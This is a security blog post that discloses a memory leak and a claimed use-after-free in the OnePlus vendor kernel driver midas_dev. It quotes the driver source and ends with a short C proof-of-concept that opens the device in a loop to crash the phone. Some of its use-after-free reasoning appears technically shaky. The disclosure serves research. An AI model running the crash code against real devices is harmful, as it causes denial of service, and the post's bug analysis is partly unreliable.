+++
title = "Oneplus kernel memory leak and potential use after free"
date = "2025-09-28T03:07:44+05:30"
author = "IamAlch3mist"
authorTwitter = "" #do not include @
cover = ""
tags = ["use-after-free", "memory-leak", "kernel-exploit"]
keywords = ["", ""]
description = "heh"
showFullContent = false
readingTime = true
hideComments = false
color = "" #color from the theme settings
+++


I borrowed a OnePlus phone from a friend to experiment with the kernel. Since the kernel is open source, I started digging (hoping for an LPE). I found a couple more bugs they are for another blog post, but here’s a neat little memory leak that can be abused for DoS and can lead to use‑after‑free.

I focused on vendor-specific drivers rather than the [mainline kernel](https://github.com/OnePlusOSS/android_kernel_oneplus_mt6893). The driver in question is: [`drivers/soc/oplus/midas/midas_dev.c`](https://github.com/OnePlusOSS/android_kernel_oneplus_mt6893/blob/oneplus/MT6893_R_11.0/drivers/soc/oplus/midas/midas_dev.c)


The driver exports the usual file operations with callbacks to open, close, mmap, and ioctl. 
```c
static const struct file_operations midas_dev_fops = {
	.open = midas_dev_open,
	.release = midas_dev_release,
	.mmap = midas_dev_mmap,
	.unlocked_ioctl = midas_dev_ioctl,
};
```

On open the driver an allocation happens using kzalloc with the size of struct midas_priv_info and stored in the pointer info. At 2 the allocated info is stored in privat_data member of filp struct which is basically a void pointer. 

On close the info pointer is retrieved from the filp struct and passed to kfree. 

```c
static int midas_dev_open(struct inode *inode, struct file *filp)
{
	int ret = 0;

	struct midas_priv_info *info = kzalloc(sizeof(struct midas_priv_info), GFP_KERNEL); // [1]  
	if (IS_ERR_OR_NULL(info))
		return -ENOMEM;

	info->mmap_addr = vmalloc_user(sizeof(struct midas_mmap_data));
	if (IS_ERR_OR_NULL(info->mmap_addr)) {
		pr_err("mmap_addr vmalloc failed!\n");
		ret = -ENOMEM;
		goto err_info_alloc;
	}

	filp->private_data = info; // [2]
	return 0;

err_info_alloc:
	kfree(info);
	return ret;
}


static int midas_dev_release(struct inode *inode, struct file *filp)
{
	struct midas_priv_info *info = filp->private_data;
	if (IS_ERR_OR_NULL(info))
		return 0;

	if (info->mmap_addr != NULL)
		vfree(info->mmap_addr);

	kfree(info); // use after free
	return 0;
}
```

There are no locks or checks on in the filp->private_data. If the driver is opened multiple times (without properly closing prior handles). The filp->private_data pointer can be overwritten with a newly allocated info. Which results in memory leak. 


On close the allocated memory is freed but file->private data holds reference to the info pointer and didn't set to NULL. Combined with the ability to open the driver multiple times leading to potential use-after-free. 

system user have permision to interact with the driver. 
```yaml
OP515BL1:/data/local/tmp # ls -al /dev/midas_dev
crw-rw---- 1 system system 238,   0 2025-09-28 04:53 /dev/midas_dev
```
Poc to crash the device using the memory leak.
```c
// aarch64-linux-gnu-gcc -static poc.c 

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>

int main(void) {

    int fd;
    for(unsigned int i = 0; i < 0xffffff; i++) {
    fd = open("/dev/midas_dev", O_RDWR);
    if (fd < 0) {
        perror("open failed");
        continue;
    }

}
    close(fd);

return 0;
}
```

{{< youtube kzA2Qn1aQik >}}
# Conclusion 
I expected good quality from oneplus it was disappointing to see such bugs. In the end I found couple more uaf.
